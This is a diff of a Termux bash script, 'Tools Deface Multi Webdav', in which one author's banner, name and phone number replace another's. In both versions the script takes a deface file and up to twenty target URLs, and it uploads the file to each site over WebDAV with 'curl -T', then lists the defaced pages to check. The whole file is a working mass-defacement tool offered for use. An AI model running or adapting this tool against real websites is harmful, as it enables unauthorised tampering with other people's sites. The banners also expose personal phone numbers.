@@ -6,137 +6,136 @@ red='\033[31;1m'
 white='\033[37;1m'                                           
 yellow='\033[33;1m'
 
-toilet -f standard " InYourDfv47 " -F gay
+toilet -f standard " Bahauddin " -F gay
 echo
 echo ""
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
-echo $green"|  [Author      ]: InYourDfv47 °      °         °     °  |"
-echo $yellow"|  [Version     ]: Deface Multi Brute Webdav  °       °  |"
-echo $red"|  [Team        ]: Termux Tools-ID  °      °      °    ° |"
-echo $white"|  [Phone       ]: 082223108828     °       °     °   °  |"
-echo $purple"|  °      °	   [Thanks To All Member]     °          |"
-echo $cyan"|  °	     °   °   [Termux Tools-ID] °	  	°|" 
-echo $green"|°	°       °[Elite Muslim Cyber Army]°	   °   ° |"
-echo $yellow"|	     °     [Nertral Cyber Team]   °    °     °   |"
-echo $red"|  °	 °        °   [2Easy 4Hack]°	    °      °    °|"
-echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+echo "\033[34;1m[^_^]\033[36;1m************************************************\033[34;1m[^_^]"
+echo $red"|  [NICK NAME     ]:   Mr.B4h4' Bahauddin                |"
+echo $red"|  [TOOLS         ]:   Tools Deface Multi Webdav          |"
+echo $red"|  [from          ]:   bendokaton TAYU PATI               |"
+echo $red"|  [NOMERKU HP/WA ]:   085726833815                        |"
+echo $white"|                   [MATURSUWUN]                          |"
+echo $white"|                   [SENG PENTING ROKOK KOPI LANCAR ]       |" 
+echo $white"|                   [KNOWLEDGE IS POWER]                   |"
+echo $white"|	                  [NIGHT PEOOPLE]                         |"
+echo "\033[34;1m[^_^]\033[36;1m************************************************\033[34;1m[^_^]"
 sleep 1
 echo
 
-echo $red"_ ▂ ▄ ▅ ▆ ▆ ▆ [ MULTI BRUTE DEFACE WEBDAV ] ▆ ▆ ▆ ▆ ▅ ▄ ▂ _"
+echo $red"-======== <|| TOOLS DEFACE WEBDAV ||> ========-"
 echo
-echo $white"*Taruh Script Di Luar Folder*"
+echo $white"<|| SIAP DI ECXECUSI MAS BRO ||>"
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno nama scrip defacemu cok"
+read -p "[*******>" script
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 1 "
+read -p "[*******>" Deface1
+curl -T /storage/emulated/0/$script $Deface1
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 2 "
+read -p "[*******>" Deface2
+curl -T /storage/emulated/0/$script $Deface2
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 3"
+read -p "[*******>" Deface3
+curl -T /storage/emulated/0/$script $Deface3
+echo $red"<||>****************************************************<||>"
+echo $white" Masukno target nomer 4"
+read -p "[*******>" Deface4
+curl -T /storage/emulated/0/$script $Deface4
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 5"
+read -p "[*******>" Deface5
+curl -T /storage/emulated/0/$script $Deface5
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 6"
+read -p "[*******>" Deface6
+curl -T /storage/emulated/0/$script $Deface6
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 7"
+read -p "[*******>" Deface7
+curl -T /storage/emulated/0/$script $Deface7
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 8"
+read -p "[*******>" Deface8
+curl -T /storage/emulated/0/$script $Deface8
 echo $red"[+]====================================================[+]"
-echo $white"Masukan nama script"
-read -p "[=======>" script
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke1"
-read -p "[=======>" Ke1
-curl -T /storage/emulated/0/$script $Ke1
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke2 "
-read -p "[=======>" Ke2
-curl -T /storage/emulated/0/$script $Ke2
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke3"
-read -p "[=======>" Ke3
-curl -T /storage/emulated/0/$script $Ke3
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke4"
-read -p "[=======>" Ke4
-curl -T /storage/emulated/0/$script $Ke4
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke5"
-read -p "[=======>" Ke5
-curl -T /storage/emulated/0/$script $Ke5
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke6"
-read -p "[=======>" Ke6
-curl -T /storage/emulated/0/$script $Ke6
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke7"
-read -p "[=======>" Ke7
-curl -T /storage/emulated/0/$script $Ke7
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke8"
-read -p "[=======>" Ke8
-curl -T /storage/emulated/0/$script $Ke8
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke9"
-read -p "[=======>" Ke9
-curl -T /storage/emulated/0/$script $Ke9
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke10"
-read -p "[=======>" Ke10
-curl -T /storage/emulated/0/$script $Ke10
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke11"
-read -p "[=======>" Ke11
-curl -T /storage/emulated/0/$script $Ke11
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke12 "
-read -p "[=======>" Ke12
-curl -T /storage/emulated/0/$script $Ke12
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke13"
-read -p "[=======>" Ke13
-curl -T /storage/emulated/0/$script $Ke13
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke14"
-read -p "[=======>" Ke14
-curl -T /storage/emulated/0/$script $Ke14
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke15"
-read -p "[=======>" Ke15
-curl -T /storage/emulated/0/$script $Ke15
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke16"
-read -p "[=======>" Ke16
-curl -T /storage/emulated/0/$script $Ke16
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke17"
-read -p "[=======>" Ke17
-curl -T /storage/emulated/0/$script $Ke17
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke18"
-read -p "[=======>" Ke18
-curl -T /storage/emulated/0/$script $Ke18
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke19"
-read -p "[=======>" Ke19
-curl -T /storage/emulated/0/$script $Ke19
-echo $red"[+]====================================================[+]"
-echo $white"Masukan Web Target Ke20"
-read -p "[=======>" Ke20
-curl -T /storage/emulated/0/$script $Ke20
-echo $red"[+]====================================================[+]"
+echo $white"Masukno target nomer 9"
+read -p "[*******>" Deface9
+curl -T /storage/emulated/0/$script $Deface9
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 10"
+read -p "[*******>" Deface10
+curl -T /storage/emulated/0/$script $Deface10
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 11"
+read -p "[*******>" Deface11
+curl -T /storage/emulated/0/$script $Deface11
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 12 "
+read -p "[*******>" Deface12
+curl -T /storage/emulated/0/$script $Deface12
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 13"
+read -p "[*******>" Deface13
+curl -T /storage/emulated/0/$script $Deface13
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 14"
+read -p "[*******>" Deface14
+curl -T /storage/emulated/0/$script $Deface14
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 15"
+read -p "[*******>" Deface15
+curl -T /storage/emulated/0/$script $Deface15
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 16"
+read -p "[*******>" Deface16
+curl -T /storage/emulated/0/$script $Deface16
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 17"
+read -p "[*******>" Deface17
+curl -T /storage/emulated/0/$script $Deface17
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 18"
+read -p "[*******>" Deface18
+curl -T /storage/emulated/0/$script $Deface18
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 19"
+read -p "[*******>" Deface19
+curl -T /storage/emulated/0/$script $Deface19
+echo $red"<||>****************************************************<||>"
+echo $white"Masukno target nomer 20"
+read -p "[*******>" Deface20
+curl -T /storage/emulated/0/$script $Deface20
+echo $red"<||>****************************************************<||>"
 echo
 sleep 1
 
-echo $red"_ ▂ ▄ ▅ ▆ ▆ ▆ ▆ ▆ [ Sedang Proses ] ▆ ▆ ▆ ▆ ▆ ▆ ▅ ▄ ▂ _"
+echo $red".:: [ NTENI DISE' YO..LAGI PROSSES] ::."
 echo $white
-echo "Silahkan Cek Web $Ke1/$script"
-echo "Silahkan Cek Web $Ke2/$script"
-echo "Silahkan Cek Web $Ke3/$script"
-echo "Silahkan Cek Web $Ke4/$script"
-echo "Silahkan Cek Web $Ke5/$script"
-echo "Silahkan Cek Web $Ke6/$script"
-echo "Silahkan Cek Web $Ke7/$script"
-echo "Silahkan Cek Web $Ke8/$script"
-echo "Silahkan Cek Web $Ke9/$script"
-echo "Silahkan Cek Web $Ke10/$script"
-echo "Silahkan Cek Web $Ke11/$script"
-echo "Silahkan Cek Web $Ke12/$script"
-echo "Silahkan Cek Web $Ke13/$script"
-echo "Silahkan Cek Web $Ke14/$script"
-echo "Silahkan Cek Web $Ke15/$script"
-echo "Silahkan Cek Web $Ke16/$script"
-echo "Silahkan Cek Web $Ke17/$script"
-echo "Silahkan Cek Web $Ke18/$script"
-echo "Silahkan Cek Web $Ke19/$script"
-echo "Silahkan Cek Web $Ke20/$script"
+echo "MONGGO DI CEK WEB E $Deface1/$script"
+echo "MONGGO DI CEK WEB E $Deface2/$script"
+echo "MONGGO DI CEK WEB E $Deface3/$script"
+echo "MONGGO DI CEK WEB E $Deface4/$script"
+echo "MONGGO DI CEK WEB E $Deface5/$script"
+echo "MONGGO DI CEK WEB E $Deface6/$script"
+echo "MONGGO DI CEK WEB E $Deface7/$script"
+echo "MONGGO DI CEK WEB E $Deface8/$script"
+echo "MONGGO DI CEK WEB E $Deface9/$script"
+echo "MONGGO DI CEK WEB E $Deface10/$script"
+echo "MONGGO DI CEK WEB E $Deface11/$script"
+echo "MONGGO DI CEK WEB E $Deface12/$script"
+echo "MONGGO DI CEK WEB E $Deface13/$script"
+echo "MONGGO DI CEK WEB E $Deface14/$script"
+echo "MONGGO DI CEK WEB E $Deface15/$script"
+echo "MONGGO DI CEK WEB E $Deface16/$script"
+echo "MONGGO DI CEK WEB E $Deface17/$script"
+echo "MONGGO DI CEK WEB E $Deface18/$script"
+echo "MONGGO DI CEK WEB E $Deface19/$script"
+echo "MONGGO DI CEK WEB E $Deface20/$script"
 
 echo
-echo $white"*Jika Gagal Berarti Gak Vuln Itu Web*"
+echo $white"-=NAK GAGAL BERARTI WEB ORA VULN=-"
 echo
-echo $red"_ ▂ ▄ ▆ ▆ ▆ ▆ [ Greets To : SMA N 1 Simo ] ▆ ▆ ▆ ▆ ▅ ▄ ▂ _"
+echo $red".::[ Mr.B4h4' Bahauddin bendokaton tayu pati  ]::."
